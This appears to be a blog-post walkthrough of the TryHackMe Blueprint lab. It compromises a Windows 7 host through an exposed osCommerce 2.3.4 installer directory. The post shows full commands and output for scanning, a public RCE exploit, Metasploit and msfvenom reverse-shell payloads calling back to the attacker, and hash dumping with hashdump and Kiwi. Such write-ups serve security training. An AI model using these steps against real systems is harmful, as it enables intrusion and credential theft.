---
layout: post
title: TryHackMe Blueprint Machine Walkthrough
categories: [writeups, tryhackme]
---

### [](#header-3)Introduction

In this walkthrough, I will be performing a full penetration test on the TryHackMe Blueprint machine. The goal of this machine is to enumerate the target, identify vulnerabilities, gain initial access, escalate privileges, and finally capture the root flag.

This machine was very interesting because it demonstrated how dangerous misconfigured web applications and exposed installation directories can be. Throughout this walkthrough, I will explain every step I performed during the exploitation process, along with some additional insights and explanations which can help beginners understand the methodology behind the attack chain.

### [](#header-3)Host Discovery

Before starting enumeration, I first verified whether the target machine was alive by sending ICMP packets using the ping command.

```js
ping -c 5 10.48.162.178
PING 10.48.162.178 (10.48.162.178) 56(84) bytes of data.
64 bytes from 10.48.162.178: icmp_seq=1 ttl=126 time=166 ms
64 bytes from 10.48.162.178: icmp_seq=2 ttl=126 time=64.6 ms
64 bytes from 10.48.162.178: icmp_seq=3 ttl=126 time=283 ms
64 bytes from 10.48.162.178: icmp_seq=4 ttl=126 time=239 ms
64 bytes from 10.48.162.178: icmp_seq=5 ttl=126 time=281 ms

--- 10.48.162.178 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4004ms
rtt min/avg/max/mdev = 64.565/206.503/282.587/82.571 ms
```

The host responded successfully, which confirmed that the machine was online and reachable from my attacking machine.

### [](#header-3)Nmap Enumeration

Now I used Nmap to gather more information about the target machine. Enumeration is one of the most important phases during penetration testing because it helps us identify attack surfaces, services, and possible vulnerabilities.

I also saved the scan output in XML format so that later I could import it directly into Metasploit Framework.

```js
nmap -sS -sV -sC -O -T4 10.48.162.178 -oX thm_blueprint.xml
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-20 14:00 +0530
Nmap scan report for 10.48.162.178
Host is up (0.19s latency).
Not shown: 988 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: 404 - File or directory not found.
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
| tls-alpn:
|_  http/1.1
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Index of /
445/tcp   open  microsoft-ds Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql        MariaDB 10.3.23 or earlier (unauthorized)
8080/tcp  open  http         Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2019-04-11 22:52  oscommerce-2.3.4/
| -     2019-04-11 22:52  oscommerce-2.3.4/catalog/
| -     2019-04-11 22:52  oscommerce-2.3.4/docs/
|_
|_http-title: Index of /
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2h PHP/5.6.28
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC
49165/tcp open  msrpc        Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.98%E=4%D=5/20%OT=80%CT=1%CU=31017%PV=Y%DS=3%DC=I%G=Y%TM=6A0D718
OS:2%P=aarch64-unknown-linux-gnu)SEQ(SP=103%GCD=1%ISR=109%TI=I%CI=I%II=I%SS
OS:=O%TS=7)SEQ(SP=104%GCD=1%ISR=105%TI=I%CI=I%II=I%SS=S%TS=8)SEQ(SP=104%GCD
OS:=1%ISR=10C%TI=I%CI=I%II=I%SS=S%TS=7)SEQ(SP=104%GCD=1%ISR=10D%TI=I%CI=I%I
OS:I=I%SS=S%TS=7)SEQ(SP=106%GCD=1%ISR=10D%TI=I%CI=I%II=I%SS=S%TS=6)OPS(O1=M
OS:4E8NW8ST11%O2=M4E8NW8ST11%O3=M4E8NW8NNT11%O4=M4E8NW8ST11%O5=M4E8NW8ST11%
OS:O6=M4E8ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%
OS:DF=Y%T=80%W=2000%O=M4E8NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=
OS:0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S
OS:=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=Z%RUCK=0%RUD=G)IE(R=Y%DFI=N%T=80%CD=
OS:Z)

Network Distance: 3 hops
Service Info: Hosts: www.example.com, BLUEPRINT, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: BLUEPRINT, NetBIOS user: <unknown>, NetBIOS MAC: 02:7b:23:3f:46:67 (unknown)
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2026-05-20T08:31:53
|_  start_date: 2026-05-20T08:24:17
| smb-os-discovery:
|   OS: Windows 7 Home Basic 7601 Service Pack 1 (Windows 7 Home Basic 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: BLUEPRINT
|   NetBIOS computer name: BLUEPRINT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-05-20T09:31:51+01:00
|_clock-skew: mean: -20m03s, deviation: 34m37s, median: -4s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 108.42 seconds
```

From the scan results, I gathered a lot of useful information:
The target machine was running Windows 7 Home Basic SP1.
SMB ports 139 and 445 were enabled.

- MariaDB was running on port 3306.
- Apache and IIS web services were running simultaneously.
- Port 8080 exposed an osCommerce 2.3.4 installation.
- SMB signing was disabled.
- HTTP TRACE method was enabled on multiple ports.

One of the most interesting findings was the osCommerce installation running on port 8080.

Nmap also revealed the following:
> oscommerce-2.3.4/
> oscommerce-2.3.4/catalog/
> oscommerce-2.3.4/docs/
This immediately became my primary attack vector.

### [](#header-3)Directory Enumeration
Now I wanted to enumerate directories and files available inside the osCommerce application. For this task, I used DIRB.

```js
dirb http://10.48.162.178:8080/oscommerce-2.3.4/catalog
```
DIRB started brute forcing common directories and files using the default wordlist.

#### [](#header-4)DIRB Findings

```js
==> DIRECTORY: /catalog/admin/
==> DIRECTORY: /catalog/install/
==> DIRECTORY: /catalog/includes/
==> DIRECTORY: /catalog/images/
```
One thing that immediately caught my attention was the /install/ directory.

The installation directory should never remain publicly accessible after deployment because attackers can abuse it to reconfigure the application or achieve remote code execution.

I stopped the DIRB scan midway because I already had enough information to continue exploitation, but in a real-world engagement it is always recommended to let the scan continue for deeper enumeration.

### [](#header-3)Vulnerability Analysis
Since I already knew the application version was osCommerce 2.3.4, I searched for publicly available exploits using Searchsploit.

```js
searchsploit oscommerce 2.3.4
```

```js
osCommerce 2.3.4 - Multiple Vulnerabilities
osCommerce 2.3.4.1 - Arbitrary File Upload
osCommerce 2.3.4.1 - Remote Code Execution
osCommerce 2.3.4.1 - Remote Code Execution (2)
```

There were multiple exploits available for this version.

I decided to use:
> osCommerce 2.3.4.1 - Remote Code Execution (2)
because it abuses the exposed installation directory to inject malicious PHP code and achieve unauthenticated remote code execution.

### [](#header-3)Initial Remote Code Execution
I executed the exploit against the vulnerable target.

```js
python3 50128.py http://10.48.162.178:8080/oscommerce-2.3.4/catalog/
[*] Install directory still available, the host likely vulnerable to the exploit.
[*] Testing injecting system command to test vulnerability
User: nt authority\system
```
The exploit worked successfully, and I immediately gained remote command execution.
I verified my privileges:
```js
RCE_SHELL$ whoami
nt authority\system
```
At this point I already had SYSTEM privileges, which is very uncommon during initial exploitation. Usually attackers need privilege escalation later in the attack chain, but due to the insecure configuration of the application, the injected PHP code executed with elevated permissions.

However, this shell was unstable and had limited interactivity. I wanted a more reliable Meterpreter session for post exploitation activities.

### [](#header-3)Using Metasploit Framework
I started PostgreSQL and launched Metasploit Framework.
```js
service postgresql start && msfconsole
```

Since I had saved the Nmap results earlier in XML format, I imported them into Metasploit. This helps organize hosts, ports, and services directly inside Metasploit’s database.

```js
msf > db_import thm_blueprint.xml
[*] Importing 'Nmap XML' data
[*] Import: Parsing with 'Nokogiri v1.14.5'
[*] Importing host 10.48.162.178
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.25/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
[*] Successfully imported /home/asad/THM_Blueprint/thm_blueprint.xml
msf > hosts

Hosts
=====

address        mac  name  os_name       os_flavor  os_sp  purpose  info  comments
-------        ---  ----  -------       ---------  -----  -------  ----  --------
10.48.162.178             Windows 2008                    server

msf > services
Services
========

host           port   proto  name          state  info
----           ----   -----  ----          -----  ----
10.48.162.178  80     tcp    http          open   Microsoft IIS httpd 7.5
10.48.162.178  135    tcp    msrpc         open   Microsoft Windows RPC
10.48.162.178  139    tcp    netbios-ssn   open   Microsoft Windows netbios-ssn
10.48.162.178  443    tcp    ssl/http      open   Apache httpd 2.4.23 OpenSSL/1.0.2h PHP/5.6.28
10.48.162.178  445    tcp    microsoft-ds  open   Windows 7 Home Basic 7601 Service Pack 1 microsoft-ds workgroup: WORKGRO
                                                  UP
10.48.162.178  3306   tcp    mysql         open   MariaDB 10.3.23 or earlier unauthorized
10.48.162.178  8080   tcp    http          open   Apache httpd 2.4.23 OpenSSL/1.0.2h PHP/5.6.28
10.48.162.178  49152  tcp    msrpc         open   Microsoft Windows RPC
10.48.162.178  49153  tcp    msrpc         open   Microsoft Windows RPC
10.48.162.178  49154  tcp    msrpc         open   Microsoft Windows RPC
10.48.162.178  49160  tcp    msrpc         open   Microsoft Windows RPC
10.48.162.178  49165  tcp    msrpc         open   Microsoft Windows RPC
```

### [](#header-3)Searching for Exploit Modules
I searched Metasploit for osCommerce related modules.

```js
msf > search oscommerce
```
#### [](#header-4)Available Modules
```js
0. exploit/unix/webapp/oscommerce_filemanager
1. exploit/multi/http/oscommerce_installer_unauth_code_exec
```
I'll use **exploit/multi/http/oscommerce_installer_unauth_code_exec**, This module specifically targets the vulnerable installer directory and injects malicious PHP code to obtain a reverse shell.

#### [](#header-4)Configuring the Exploit Module
I configured the exploit with the target details.

```js
msf > use 1
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf exploit(multi/http/oscommerce_installer_unauth_code_exec) > setg RHOSTS 10.48.162.178
RHOSTS => 10.48.162.178
msf exploit(multi/http/oscommerce_installer_unauth_code_exec) > set RPORT 8080
RPORT => 8080
msf exploit(multi/http/oscommerce_installer_unauth_code_exec) > set URI /oscommerce-2.3.4/catalog/install
URI => /oscommerce-2.3.4/catalog/install
msf exploit(multi/http/oscommerce_installer_unauth_code_exec) > set LHOST tun0
LHOST => 192.168.143.183
```

After setting the required options, I executed the exploit.
```js
exploit
```

#### [](#header-4)Meterpreter Session
The exploit successfully opened a Meterpreter session.
```js
msf exploit(multi/http/oscommerce_installer_unauth_code_exec) > exploit
[*] Started reverse TCP handler on 192.168.143.183:4444 
[*] Sending stage (42137 bytes) to 10.48.162.178
[*] Meterpreter session 1 opened (192.168.143.183:4444 -> 10.48.162.178:49462) at 2026-05-20 14:59:58 +0530

meterpreter > sysinfo
Computer     : BLUEPRINT
OS           : Windows NT BLUEPRINT 6.1 build 7601 (Windows 7 Home Basic Edition Service Pack 1) i586
Architecture : i586
Meterpreter  : php/windows
meterpreter > getuid
Server username: 
meterpreter > 
```

Even though I had shell access, the current session was still not ideal for deeper post exploitation activities.

So I decided to generate my own payload using MSFVenom.

#### [](#header-4)Generating a Custom Payload
I created a Windows Meterpreter reverse TCP payload.

```js
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.143.183 LPORT=5555 -f exe -o blueprint_win_payload.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 7168 bytes
Saved as: blueprint_win_payload.exe
```
MSFVenom generated an x86 Windows executable payload.

Before executing the payload on the victim machine, I configured a listener using Metasploit’s multi/handler module.
```js
msf > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf exploit(multi/handler) > set LHOST 192.168.143.183
LHOST => 192.168.143.183
msf exploit(multi/handler) > set LPORT 5555
LPORT => 5555
msf exploit(multi/handler) > exploit
[*] Started reverse TCP handler on 192.168.143.183:5555 
```
This listener waits for incoming reverse shell connections from the victim.

#### [](#header-4)Uploading the Payload
Inside the existing Meterpreter session, I navigated to the C:\ drive and created a temporary directory.
```js
meterpreter > pwd
C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes
meterpreter > cd C:\\
meterpreter > mkdir Temp
Creating directory: Temp
meterpreter > cd Temp
meterpreter > ls
No entries exist in C:\Temp
```
I uploaded the payload file.
```js
meterpreter > upload /home/asad/THM_Blueprint/blueprint_win_payload.exe
[*] Uploading  : /home/asad/THM_Blueprint/blueprint_win_payload.exe -> blueprint_win_payload.exe
[*] Uploaded -1.00 B of 7.00 KiB (-0.01%): /home/asad/THM_Blueprint/blueprint_win_payload.exe -> blueprint_win_payload.exe
[*] Completed  : /home/asad/THM_Blueprint/blueprint_win_payload.exe -> blueprint_win_payload.exe
```
After uploading the payload successfully, I executed it.
```js
execute -f blueprint_win_payload.exe
```

#### [](#header-4)SYSTEM Level Access
As soon as the payload executed, my multi-handler received a new Meterpreter session.
```js
[*] Started reverse TCP handler on 192.168.143.183:5555 
[*] Sending stage (190534 bytes) to 10.48.162.178
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.25/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
[*] Meterpreter session 1 opened (192.168.143.183:5555 -> 10.48.162.178:49566) at 2026-05-20 16:01:34 +0530
```
I verified the privileges:
```js
meterpreter > sysinfo
Computer        : BLUEPRINT
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x86
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x86/windows
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
Now I had a stable Meterpreter session running with full SYSTEM privileges.
At this stage, the target machine was completely compromised.

### [](#header-3)Capturing the Root Flag
I navigated to the Administrator Desktop.
```js
meterpreter > pwd
C:\Temp
meterpreter > cd C:\\
meterpreter > cd Users
meterpreter > cd Administrator
meterpreter > cd Desktop
meterpreter > ls
Listing: C:\Users\Administrator\Desktop

100666/rw-rw-rw-  282   fil   2019-04-12 04:06:47 +0530  desktop.ini
100666/rw-rw-rw-  37    fil   2019-11-27 23:45:37 +0530  root.txt.txt
```
I displayed the contents of the root flag.
```js
meterpreter > cat root.txt.txt
```

### [](#header-3)Dumping Password Hashes
Since I already had SYSTEM privileges, I decided to dump password hashes from the SAM database.

Using Meterpreter:
```js
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:549a1bcb88e35dc18c7a0b0168631411:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450:::
```

These NTLM hashes can later be cracked using:
* JohnTheRipper
* Hashcat
* Online NTLM cracking services

Meterpreter provides the Kiwi extension, which integrates Mimikatz functionality directly into the session.

I loaded the extension:
```js
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x86/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
```
Then I dumped the SAM database again using Kiwi.
```js
meterpreter > lsa_dump_sam
[+] Running as SYSTEM
[*] Dumping SAM
Domain : BLUEPRINT
SysKey : 147a48de4a9815d2aa479598592b086f
Local SID : S-1-5-21-3130159037-241736515-3168549210

SAMKey : 3700ddba8f7165462130a4441ef47500

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 549a1bcb88e35dc18c7a0b0168631411

RID  : 000001f5 (501)
User : Guest

RID  : 000003e8 (1000)
User : Lab
  Hash NTLM: 30e87bf999828446a1c1209ddde4c450
```

This confirmed that the hashes were extracted successfully.

### [](#header-3)Conclusion
The Blueprint machine was a very good beginner-friendly Windows exploitation lab that covered:
* Enumeration
* Web exploitation
* Remote Code Execution
* Reverse shells
* Meterpreter sessions
* Post exploitation
* Hash dumping

The main vulnerability was the exposed osCommerce installation directory combined with an outdated version of the application.

This walkthrough showed how a simple web application misconfiguration can eventually lead to complete SYSTEM-level compromise of a Windows machine.